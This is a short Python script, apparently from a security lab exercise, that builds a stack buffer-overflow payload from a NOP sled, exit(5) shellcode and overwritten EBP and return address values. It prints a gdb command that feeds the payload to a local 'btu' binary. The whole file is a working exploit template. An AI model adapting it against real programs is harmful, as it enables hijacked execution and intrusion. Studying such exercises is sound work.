def generate_shellcode():
    # NOP sled (first and second half)
    nop_sled_first_half = "\\x90" * 4
    nop_sled_second_half = "\\x90" * 34

    # Shellcode to call exit(5)
    shell_code = "\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x05\\xcd\\x80"

    # Overwrite EBP and return address (little endian)
    ebp = "\\xd8\\xcd\\xff\\xff"
    ret_address = "\\xac\\xcd\\xff\\xff"

    # Combine all components
    payload = nop_sled_first_half + shell_code + nop_sled_second_half + ebp + ret_address
    return payload

if __name__ == "__main__":
    shellcode = generate_shellcode()
    print(f'gdb --args ./build/bin/btu remove 1025 $(echo -e "{shellcode}")')
